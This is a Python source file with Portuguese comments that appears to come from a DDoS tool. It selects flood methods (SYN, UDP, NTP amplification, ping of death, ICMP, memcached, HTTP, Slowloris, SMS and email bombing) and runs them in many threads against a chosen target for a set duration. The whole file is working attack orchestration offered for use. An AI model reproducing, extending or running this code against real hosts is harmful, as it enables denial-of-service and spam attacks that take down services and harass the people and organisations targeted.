# Importar modulos
from time import time, sleep
from threading import Thread
from colorama import Fore
from humanfriendly import format_timespan, Spinner
from tools.crash import CriticalError
from tools.ipTools import GetTargetAddress, InternetConnectionCheck

""" Procura e encontra o metodo DDOS """


def GetMethodByName(method):
    if method == "SMS":
        dir = "tools.SMS.main"
    elif method == "EMAIL":
        dir = "tools.EMAIL.main"
    elif method in ("SYN", "UDP", "NTP", "POD", "ICMP", "MEMCACHED"):
        dir = f"tools.L4.{method.lower()}"
    elif method in ("HTTP", "SLOWLORIS"):
        dir = f"tools.L7.{method.lower()}"
    else:
        raise SystemExit(
            f"{Fore.RED}[!] {Fore.MAGENTA}Metodo DDOS desconhecido.. {repr(method)} selecionado..{Fore.RESET}"
        )
    module = __import__(dir, fromlist=["object"])
    if hasattr(module, "flood"):
        method = getattr(module, "flood")
        return method
    else:
        CriticalError(
            f"Metodo 'flood' nao encontrado em {repr(dir)}. Usa Python 3.8", "-"
        )


    """ Class para controlar os metodos de ataque """


class AttackMethod:

    # Constructor
    def __init__(self, name, duration, threads, target):
        self.name = name
        self.duration = duration
        self.threads_count = threads
        self.target_name = target
        self.target = target
        self.threads = []
        self.is_running = False

    # Entrada
    def __enter__(self):
        InternetConnectionCheck()
        self.method = GetMethodByName(self.name)
        self.target = GetTargetAddress(self.target_name, self.name)
        return self

    # Saida
    def __exit__(self, exc_type, exc_val, exc_tb):
        print(f"{Fore.MAGENTA}[!] {Fore.BLUE}Ataque completo!{Fore.RESET}")

    # Verifica de tempo de execução
    def __RunTimer(self):
        __stopTime = time() + self.duration
        while time() < __stopTime:
            if not self.is_running:
                return
            sleep(1)
        self.is_running = False

    # Inicia o flooder
    def __RunFlood(self):
        while self.is_running:
            self.method(self.target)

    # Inicia as threads
    def __RunThreads(self):
        # Inicia o tempo das threads
        thread = Thread(target=self.__RunTimer)
        thread.start()
        # Verifica se é 1 thread
        if self.name == "EMAIL":
            self.threads_count = 1
        # Cria o flood das threads
        for _ in range(self.threads_count):
            thread = Thread(target=self.__RunFlood)
            self.threads.append(thread)
        # Inicia o flood de threads
        with Spinner(
            label=f"{Fore.YELLOW}Starting {self.threads_count} threads{Fore.RESET}",
            total=100,
        ) as spinner:
            for index, thread in enumerate(self.threads):
                thread.start()
                spinner.step(100 / len(self.threads) * (index + 1))
        # Espera que o flood de threads termine
        for index, thread in enumerate(self.threads):
            thread.join()
            print(
                f"{Fore.GREEN}[+] {Fore.YELLOW}Thread parada {index + 1}.{Fore.RESET}"
            )

    # Inicia o ataque DDOS
    def Start(self):
        if self.name == "EMAIL":
            target = self.target_name
        else:
            target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
        duration = format_timespan(self.duration)
        print(
            f"{Fore.MAGENTA}[?] {Fore.BLUE}Começando o ataque {target} utiilzando o método {self.name}.{Fore.RESET}\n"
            f"{Fore.MAGENTA}[?] {Fore.BLUE}O ataque será interrompido após {Fore.MAGENTA}{duration}{Fore.BLUE}.{Fore.RESET}"
        )
        self.is_running = True
        try:
            self.__RunThreads()
        except KeyboardInterrupt:
            self.is_running = False
            print(
                f"\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detetado. Parando {self.threads_count} threads..{Fore.RESET}"
            )
            # Espera que as threads terminem
            for thread in self.threads:
                thread.join()
        except Exception as err:
            print(err)
